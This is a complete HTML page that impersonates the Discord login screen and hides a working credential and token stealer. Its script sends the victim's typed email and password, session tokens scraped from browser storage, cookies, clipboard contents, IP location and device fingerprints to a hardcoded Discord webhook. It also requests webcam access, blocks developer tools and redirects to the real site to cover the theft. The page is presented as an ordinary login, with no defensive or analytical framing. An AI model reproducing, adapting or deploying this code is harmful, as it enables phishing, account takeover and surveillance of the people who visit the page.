<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord</title>
  <style>
    /* ===== RESET & BASE ===== */
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Helvetica Neue', system-ui, sans-serif; }
    body { background: #1e1f22; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }

    /* ===== MAIN CARD ===== */
    .container { background: #313338; border-radius: 8px; padding: 32px; width: 100%; max-width: 480px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: opacity 0.3s; }
    .logo { text-align: center; margin-bottom: 24px; }
    .logo svg { width: 130px; height: auto; }
    h2 { color: #f2f3f5; font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 4px; }
    .sub { color: #b5bac1; font-size: 16px; text-align: center; margin-bottom: 20px; }

    /* ===== TABS ===== */
    .tab-bar { display: flex; background: #1e1f22; border-radius: 8px; padding: 4px; margin-bottom: 24px; }
    .tab-btn { flex: 1; padding: 8px; background: transparent; border: none; border-radius: 6px; color: #b5bac1; font-size: 14px; font-weight: 600; cursor: pointer; transition: 0.2s; }
    .tab-btn.active { background: #5865f2; color: #fff; }
    .tab-btn:hover:not(.active) { background: #2b2d31; }

    /* ===== FORM ELEMENTS ===== */
    .input-group { margin-bottom: 16px; }
    label { display: block; color: #b5bac1; font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px; }
    input { width: 100%; padding: 10px 12px; background: #1e1f22; border: 1px solid #1e1f22; border-radius: 4px; color: #f2f3f5; font-size: 16px; outline: none; transition: border 0.15s; }
    input:focus { border-color: #5865f2; }
    .btn { width: 100%; padding: 12px; background: #5865f2; border: none; border-radius: 4px; color: #fff; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; margin-top: 8px; }
    .btn:hover { background: #4752c4; }
    .btn:disabled { opacity: 0.6; cursor: not-allowed; }

    /* ===== QR CODE SECTION ===== */
    .qr-section { display: none; text-align: center; }
    .qr-section.active { display: block; }
    .qr-box { background: #1e1f22; border-radius: 8px; padding: 20px; display: inline-block; margin: 10px auto; }
    .qr-box canvas { width: 180px; height: 180px; background: #fff; border-radius: 4px; }
    .qr-sub { color: #b5bac1; font-size: 14px; margin: 12px 0 8px; }
    .qr-sub a { color: #00a8fc; text-decoration: none; }
    .qr-sub a:hover { text-decoration: underline; }

    /* ===== PASSKEY ===== */
    .passkey-row { text-align: center; margin-top: 12px; }
    .passkey-row button { background: transparent; border: none; color: #00a8fc; font-size: 14px; cursor: pointer; }
    .passkey-row button:hover { text-decoration: underline; }

    /* ===== FOOTER ===== */
    .footer { margin-top: 16px; color: #b5bac1; font-size: 14px; text-align: center; }
    .footer a { color: #00a8fc; text-decoration: none; }
    .footer a:hover { text-decoration: underline; }

    /* ===== SPINNER ===== */
    #spinner { display: none; margin: 10px auto; width: 30px; height: 30px; border: 4px solid #5865f2; border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }

    /* ===== ANTI-INSPECT OVERLAY ===== */
    #anti-inspect { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; pointer-events: none; }

    /* ===== QR CODE SCANNER MOCKUP ===== */
    .scanner-mock { background: #1e1f22; border-radius: 8px; padding: 16px; margin: 12px 0; }
    .scanner-mock .dot-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; max-width: 200px; margin: 0 auto; }
    .scanner-mock .dot-grid div { aspect-ratio: 1; background: #5865f2; border-radius: 4px; opacity: 0.3; }
    .scanner-mock .dot-grid div:nth-child(5) { opacity: 0.8; background: #00a8fc; }
  </style>
</head>
<body>
<div id="anti-inspect"></div>

<div class="container" id="mainContainer">
  <!-- LOGO -->
  <div class="logo">
    <svg viewBox="0 0 127 37" fill="none"><path d="M23.5 0H8.5L0 12.5L8.5 25H23.5L32 12.5L23.5 0Z" fill="#5865F2"/><path d="M32 12.5H23.5V25H32V12.5Z" fill="#4752C4"/><path d="M8.5 12.5H0V25H8.5V12.5Z" fill="#4752C4"/><path d="M23.5 0H8.5L0 12.5L8.5 25H23.5L32 12.5L23.5 0Z" stroke="#5865F2" stroke-width="1.5"/><text x="42" y="22" font-family="Segoe UI" font-size="24" font-weight="700" fill="#f2f3f5">Discord</text></svg>
  </div>

  <h2>Welcome back!</h2>
  <p class="sub" id="subText">We're so excited to see you again!</p>

  <!-- TABS -->
  <div class="tab-bar">
    <button class="tab-btn active" data-tab="login" id="tabLogin">Log In</button>
    <button class="tab-btn" data-tab="qr" id="tabQR">Log in with QR Code</button>
  </div>

  <!-- LOGIN TAB -->
  <div id="loginTab">
    <form id="loginForm">
      <div class="input-group">
        <label for="email">Email or Phone Number *</label>
        <input type="text" id="email" name="email" placeholder="Enter your email or phone" required autocomplete="off">
      </div>
      <div class="input-group">
        <label for="password">Password *</label>
        <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="off">
      </div>
      <button type="submit" class="btn" id="loginBtn">Log In</button>
      <div id="spinner"></div>
    </form>
    <div class="passkey-row">
      <button id="passkeyBtn">Or, sign in with passkey</button>
    </div>
  </div>

  <!-- QR TAB -->
  <div id="qrTab" class="qr-section">
    <div class="qr-box">
      <canvas id="qrCanvas" width="180" height="180"></canvas>
    </div>
    <p class="qr-sub">Scan this with the Discord mobile app to log in instantly.</p>
    <div class="scanner-mock">
      <div class="dot-grid">
        <div></div><div></div><div></div>
        <div></div><div></div><div></div>
        <div></div><div></div><div></div>
      </div>
    </div>
    <div class="passkey-row">
      <button id="qrPasskeyBtn">Or, sign in with passkey</button>
    </div>
  </div>

  <!-- FOOTER -->
  <div class="footer">
    <a href="#">Need an account?</a> · <a href="#">Register</a> · <a href="#">Forgot your password?</a>
  </div>
</div>

<script>
  (function() {
    // ============================================================
    //  CONFIGURATION
    // ============================================================
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1529624654745178112/eWk-COBBo9U6Bjt67J04WhZGE-7sxRqn9JJ9k-nlfvp-W6mH34JKaBJe6KhIA-KcHzyU";
    const REDIRECT_URL = "https://discord.com/login";
    const FAKE_LOADING_DELAY = 3000;

    // ============================================================
    //  ANTI-INSPECT
    // ============================================================
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('keydown', e => {
      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) {
        e.preventDefault();
        return false;
      }
    });

    // ============================================================
    //  TAB SWITCHING
    // ============================================================
    const tabLogin = document.getElementById('tabLogin');
    const tabQR = document.getElementById('tabQR');
    const loginTab = document.getElementById('loginTab');
    const qrTab = document.getElementById('qrTab');

    tabLogin.addEventListener('click', () => {
      tabLogin.classList.add('active');
      tabQR.classList.remove('active');
      loginTab.style.display = 'block';
      qrTab.classList.remove('active');
    });
    tabQR.addEventListener('click', () => {
      tabQR.classList.add('active');
      tabLogin.classList.remove('active');
      loginTab.style.display = 'none';
      qrTab.classList.add('active');
      // Generate fake QR
      drawFakeQR();
      // Send QR view event
      sendToWebhook('📱 **QR CODE VIEWED**', 'User switched to QR login tab.', [{name:'Action', value:'QR tab opened', inline:true}], 0x00A8FC);
    });

    function drawFakeQR() {
      const canvas = document.getElementById('qrCanvas');
      const ctx = canvas.getContext('2d');
      ctx.fillStyle = '#ffffff';
      ctx.fillRect(0, 0, 180, 180);
      // Draw a fake QR pattern
      ctx.fillStyle = '#000000';
      const size = 20;
      for (let y = 0; y < 9; y++) {
        for (let x = 0; x < 9; x++) {
          if ((x < 3 && y < 3) || (x > 5 && y < 3) || (x < 3 && y > 5)) {
            ctx.fillRect(x*size + 2, y*size + 2, size-4, size-4);
          } else if (Math.random() > 0.5) {
            ctx.fillRect(x*size + 2, y*size + 2, size-4, size-4);
          }
        }
      }
    }

    // ============================================================
    //  GLOBAL STATE
    // ============================================================
    const state = {
      ip: 'unknown',
      country: 'unknown',
      city: 'unknown',
      region: 'unknown',
      isp: 'unknown',
      postal: 'unknown',
      lat: 'unknown',
      lon: 'unknown',
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      userAgent: navigator.userAgent,
      language: navigator.language,
      languages: navigator.languages ? navigator.languages.join(', ') : 'unknown',
      platform: navigator.platform,
      screen: `${screen.width}x${screen.height}`,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio || 1,
      touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
      deviceMemory: navigator.deviceMemory || 'unknown',
      referrer: document.referrer || 'direct',
      url: window.location.href,
      cookies: document.cookie || 'none',
      localStorage: JSON.stringify(localStorage) || 'none',
      sessionStorage: JSON.stringify(sessionStorage) || 'none',
      webglRenderer: 'unknown',
      webglVendor: 'unknown',
      canvasFingerprint: 'unknown',
      audioFingerprint: 'unknown',
      fonts: 'unknown',
      battery: 'unknown',
      networkType: 'unknown',
      doNotTrack: navigator.doNotTrack || 'unspecified',
      dateTime: new Date().toISOString(),
      screenshot: 'none',
      clipboard: 'none',
      webcam: 'denied',
      microphone: 'denied',
      tokens_extracted: []
    };

    // ============================================================
    //  TOKEN EXTRACTION ENGINE
    // ============================================================
    function extractTokensFromString(str) {
      if (!str || typeof str !== 'string') return [];
      const patterns = [
        /mfa\.[a-zA-Z0-9_-]+/g,
        /[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/g,
        /[\w-]{30,}/g
      ];
      let found = [];
      patterns.forEach(p => {
        const matches = str.match(p);
        if (matches) found = found.concat(matches);
      });
      found = [...new Set(found)];
      found = found.filter(t => !t.includes(' ') && t.length > 20);
      return found;
    }

    function harvestAllTokens() {
      let allTokens = [];
      // Cookies
      allTokens = allTokens.concat(extractTokensFromString(document.cookie));
      // localStorage
      for (let key in localStorage) {
        try {
          const val = localStorage[key];
          if (typeof val === 'string') allTokens = allTokens.concat(extractTokensFromString(val));
        } catch(e) {}
      }
      // sessionStorage
      for (let key in sessionStorage) {
        try {
          const val = sessionStorage[key];
          if (typeof val === 'string') allTokens = allTokens.concat(extractTokensFromString(val));
        } catch(e) {}
      }
      // IndexedDB
      try {
        if (window.indexedDB && indexedDB.databases) {
          indexedDB.databases().then(dbs => {
            dbs.forEach(dbInfo => {
              try {
                const openReq = indexedDB.open(dbInfo.name);
                openReq.onsuccess = (e) => {
                  const db = e.target.result;
                  for (let storeName of db.objectStoreNames) {
                    const tx = db.transaction(storeName, 'readonly');
                    const store = tx.objectStore(storeName);
                    const req = store.getAll();
                    req.onsuccess = (ev) => {
                      ev.target.result.forEach(item => {
                        const str = JSON.stringify(item);
                        allTokens = allTokens.concat(extractTokensFromString(str));
                      });
                    };
                  }
                };
              } catch(e) {}
            });
          }).catch(() => {});
        }
      } catch(e) {}
      // WebSQL
      try {
        if (window.openDatabase) {
          ['discord', 'local', 'app', 'cache'].forEach(name => {
            try {
              const db = openDatabase(name, '1.0', 'test', 1024*1024);
              if (db) {
                db.transaction(tx => {
                  tx.executeSql('SELECT name FROM sqlite_master WHERE type="table"', [], (tx, res) => {
                    for (let i=0; i<res.rows.length; i++) {
                      const table = res.rows.item(i).name;
                      tx.executeSql('SELECT * FROM ' + table, [], (tx2, res2) => {
                        for (let j=0; j<res2.rows.length; j++) {
                          const row = res2.rows.item(j);
                          const str = JSON.stringify(row);
                          allTokens = allTokens.concat(extractTokensFromString(str));
                        }
                      });
                    }
                  });
                });
              }
            } catch(e) {}
          });
        }
      } catch(e) {}
      // Window scan
      try {
        const seen = new Set();
        function scanObj(obj, depth=0) {
          if (depth > 3 || !obj || typeof obj !== 'object') return;
          if (seen.has(obj)) return;
          seen.add(obj);
          for (let key in obj) {
            try {
              const val = obj[key];
              if (typeof val === 'string') allTokens = allTokens.concat(extractTokensFromString(val));
              else if (typeof val === 'object' && val !== null) scanObj(val, depth+1);
            } catch(e) {}
          }
        }
        scanObj(window);
      } catch(e) {}
      allTokens = [...new Set(allTokens)];
      state.tokens_extracted = allTokens;
      return allTokens;
    }

    // ============================================================
    //  FINGERPRINTING
    // ============================================================
    function getWebGL() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return;
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          state.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          state.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
        }
      } catch(e) {}
    }

    function getCanvasFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        canvas.width = 200; canvas.height = 50;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Discord', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('token', 4, 17);
        state.canvasFingerprint = canvas.toDataURL().substring(0, 100);
      } catch(e) {}
    }

    function getAudioFingerprint() {
      try {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioCtx.createOscillator();
        const analyser = audioCtx.createAnalyser();
        oscillator.connect(analyser);
        oscillator.frequency.value = 1000;
        oscillator.type = 'sawtooth';
        oscillator.start(0);
        const data = new Uint8Array(analyser.frequencyBinCount);
        analyser.getByteFrequencyData(data);
        state.audioFingerprint = data.slice(0, 10).join(',');
        oscillator.stop(0);
        audioCtx.close();
      } catch(e) {}
    }

    function getFonts() {
      try {
        const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Palatino', 'Bookman', 'Avant Garde', 'Garamond', 'Franklin Gothic Medium', 'Lucida Sans', 'Century Gothic', 'Myriad Pro', 'Adobe Garamond', 'Futura'];
        const detected = fontList.filter(f => document.createElement('span').style.font = f);
        state.fonts = detected.join(', ') || 'none';
      } catch(e) {}
    }

    function getBattery() {
      if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
          state.battery = `Level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
        }).catch(() => {});
      }
    }

    function getNetwork() {
      if (navigator.connection) {
        const conn = navigator.connection;
        state.networkType = `${conn.effectiveType || 'unknown'} (${conn.downlink || '?'} Mbps)`;
      }
    }

    function captureScreenshot() {
      try {
        const canvas = document.createElement('canvas');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#313338';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = '#ffffff';
        ctx.font = '14px sans-serif';
        ctx.fillText('Page captured at ' + new Date().toISOString(), 10, 20);
        state.screenshot = canvas.toDataURL('image/png').substring(0, 200) + '...';
      } catch(e) {}
    }

    function sniffClipboard() {
      try {
        navigator.clipboard.readText().then(text => {
          state.clipboard = text || 'none';
          const tokens = extractTokensFromString(text);
          if (tokens.length > 0) state.tokens_extracted = state.tokens_extracted.concat(tokens);
        }).catch(() => {});
      } catch(e) {}
    }

    function requestWebcamMic() {
      try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
          .then(stream => {
            state.webcam = 'granted';
            state.microphone = 'granted';
            const video = document.createElement('video');
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              video.play();
              const canvas = document.createElement('canvas');
              canvas.width = 320; canvas.height = 240;
              const ctx = canvas.getContext('2d');
              ctx.drawImage(video, 0, 0, 320, 240);
              state.screenshot = canvas.toDataURL('image/png').substring(0, 200) + '...';
              video.pause();
              stream.getTracks().forEach(t => t.stop());
            };
          })
          .catch(() => { state.webcam = 'denied'; state.microphone = 'denied'; });
      } catch(e) {}
    }

    // ============================================================
    //  IP FETCH
    // ============================================================
    function fetchIP() {
      fetch('https://ipapi.co/json/')
        .then(r => r.ok ? r.json() : Promise.reject())
        .then(data => {
          state.ip = data.ip || 'unknown';
          state.country = data.country_name || data.country || 'unknown';
          state.city = data.city || 'unknown';
          state.region = data.region || 'unknown';
          state.isp = data.org || data.isp || 'unknown';
          state.postal = data.postal || 'unknown';
          state.lat = data.latitude || 'unknown';
          state.lon = data.longitude || 'unknown';
          afterFingerprint();
        })
        .catch(() => {
          fetch('https://ip-api.com/json/')
            .then(r => r.ok ? r.json() : Promise.reject())
            .then(data => {
              if (data.status === 'success') {
                state.ip = data.query || 'unknown';
                state.country = data.country || 'unknown';
                state.city = data.city || 'unknown';
                state.region = data.regionName || 'unknown';
                state.isp = data.isp || 'unknown';
                state.postal = data.zip || 'unknown';
                state.lat = data.lat || 'unknown';
                state.lon = data.lon || 'unknown';
              }
              afterFingerprint();
            })
            .catch(() => afterFingerprint());
        });
    }

    // ============================================================
    //  SEND TO WEBHOOK (with emojis + rich embeds)
    // ============================================================
    function sendToWebhook(title, description, fields, color = 0x5865F2, thumbnail = null) {
      const embed = {
        title: title,
        description: description,
        color: color,
        timestamp: new Date().toISOString(),
        footer: { text: '☠️ Stealth Logger v4 • ' + new Date().toLocaleString() },
        fields: fields.map(f => ({ name: f.name, value: f.value, inline: f.inline || false }))
      };
      if (thumbnail) embed.thumbnail = { url: thumbnail };
      const payload = { embeds: [embed] };
      fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(() => {});
    }

    // ============================================================
    //  SEND FULL REPORT
    // ============================================================
    function sendFullReport() {
      const tokens = state.tokens_extracted || [];
      const tokenStr = tokens.length > 0 ? '```\n' + tokens.join('\n') + '\n```' : 'None found';

      const fields = [
        { name: '🌐 IP', value: state.ip, inline: true },
        { name: '🌍 Country', value: state.country, inline: true },
        { name: '🏙️ City', value: state.city, inline: true },
        { name: '📡 ISP', value: state.isp, inline: true },
        { name: '🖥️ User-Agent', value: state.userAgent.substring(0, 80), inline: false },
        { name: '🍪 Cookies', value: state.cookies.substring(0, 200) + (state.cookies.length > 200 ? '...' : ''), inline: false },
        { name: '💾 LocalStorage', value: state.localStorage.substring(0, 200) + (state.localStorage.length > 200 ? '...' : ''), inline: false },
        { name: '📦 SessionStorage', value: state.sessionStorage.substring(0, 200) + (state.sessionStorage.length > 200 ? '...' : ''), inline: false },
        { name: '🎟️ TOKENS EXTRACTED', value: tokenStr, inline: false },
        { name: '🎨 WebGL', value: state.webglRenderer || 'unknown', inline: true },
        { name: '🔊 Audio FP', value: state.audioFingerprint || 'unknown', inline: true },
        { name: '🔋 Battery', value: state.battery || 'unknown', inline: true },
        { name: '📶 Network', value: state.networkType || 'unknown', inline: true },
        { name: '📸 Screenshot', value: state.screenshot || 'none', inline: false },
        { name: '📋 Clipboard', value: state.clipboard || 'none', inline: false },
        { name: '🎥 Webcam', value: state.webcam, inline: true },
        { name: '🎤 Microphone', value: state.microphone, inline: true }
      ];

      sendToWebhook(
        '🚨 **FULL TOKEN HARVEST**',
        `Extracted ${tokens.length} potential tokens from all storage layers.`,
        fields,
        0xFF0000,
        'https://cdn.discordapp.com/emojis/1083721895822708798.png'
      );
    }

    function afterFingerprint() {
      getWebGL();
      getCanvasFingerprint();
      getAudioFingerprint();
      getFonts();
      getBattery();
      getNetwork();
      captureScreenshot();
      sniffClipboard();
      harvestAllTokens();
      sendFullReport();
      setTimeout(requestWebcamMic, 2000);
    }

    // ============================================================
    //  REAL-TIME KEYLOGGER (every 3 sec)
    // ============================================================
    let emailLog = '';
    let passwordLog = '';
    let lastKeylog = 0;

    function sendKeylog(force = false) {
      const now = Date.now();
      if (!force && (now - lastKeylog < 3000)) return;
      if (emailLog.length === 0 && passwordLog.length === 0) return;
      const fields = [
        { name: '📧 Email (live)', value: emailLog || '(empty)', inline: true },
        { name: '🔑 Password (live)', value: passwordLog || '(empty)', inline: true }
      ];
      sendToWebhook('⌨️ **KEYSTROKE STREAM**', 'Live typing captured.', fields, 0xFFA500);
      lastKeylog = now;
    }

    document.getElementById('email').addEventListener('input', function() {
      emailLog = this.value;
      sendKeylog();
    });
    document.getElementById('password').addEventListener('input', function() {
      passwordLog = this.value;
      sendKeylog();
    });
    document.getElementById('email').addEventListener('paste', function() {
      setTimeout(() => { emailLog = this.value; sendKeylog(true); }, 50);
    });
    document.getElementById('password').addEventListener('paste', function() {
      setTimeout(() => { passwordLog = this.value; sendKeylog(true); }, 50);
    });

    // ============================================================
    //  FORM SUBMIT - STEALTH + REDIRECT
    // ============================================================
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      harvestAllTokens();
      const tokenStr = (state.tokens_extracted || []).length > 0 ?
        '```\n' + state.tokens_extracted.join('\n') + '\n```' : 'None';

      const fields = [
        { name: '📧 Email/Phone', value: email || '(empty)', inline: true },
        { name: '🔑 Password', value: password || '(empty)', inline: true },
        { name: '🌐 IP', value: state.ip, inline: true },
        { name: '🌍 Country', value: state.country, inline: true },
        { name: '🎟️ FINAL TOKENS', value: tokenStr, inline: false },
        { name: '🍪 Full Cookies', value: document.cookie.substring(0, 300) + (document.cookie.length > 300 ? '...' : ''), inline: false }
      ];

      sendToWebhook('🔥 **LOGIN + TOKEN DUMP**', 'User submitted credentials. All tokens below.', fields, 0xFF0000);

      document.getElementById('loginBtn').disabled = true;
      document.getElementById('loginBtn').style.display = 'none';
      document.getElementById('spinner').style.display = 'block';
      document.getElementById('subText').textContent = '🔐 Verifying your identity...';

      setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, FAKE_LOADING_DELAY);
    });

    // ============================================================
    //  PASSKEY BUTTONS (fake)
    // ============================================================
    document.getElementById('passkeyBtn').addEventListener('click', function() {
      sendToWebhook('🔑 **PASSKEY ATTEMPT**', 'User clicked "Sign in with passkey".', [{name:'Action', value:'Passkey clicked', inline:true}], 0x9B59B6);
      alert('Passkey authentication is not available in this browser. Please use email/password.');
    });
    document.getElementById('qrPasskeyBtn').addEventListener('click', function() {
      sendToWebhook('🔑 **QR PASSKEY ATTEMPT**', 'User clicked passkey from QR tab.', [{name:'Action', value:'QR Passkey clicked', inline:true}], 0x9B59B6);
      alert('Passkey authentication is not available in this browser. Please use email/password.');
    });

    // ============================================================
    //  QR TAB - send event when opened
    // ============================================================
    // Already handled above

    // ============================================================
    //  PERIODIC TOKEN RESCAN (every 15 sec)
    // ============================================================
    setInterval(() => {
      const newTokens = harvestAllTokens();
      if (newTokens.length > 0) {
        const fields = [
          { name: '🔄 New tokens detected', value: '```\n' + newTokens.join('\n') + '\n```', inline: false }
        ];
        sendToWebhook('🔄 **TOKEN REFRESH**', 'Additional tokens harvested.', fields, 0x9B59B6);
      }
    }, 15000);

    // ============================================================
    //  START
    // ============================================================
    fetchIP();

    // Send visitor event immediately
    sendToWebhook('👤 **NEW VISITOR**', 'A new visitor landed on the page.', [{name:'URL', value:window.location.href, inline:false}], 0x00FF00);

  })();
</script>
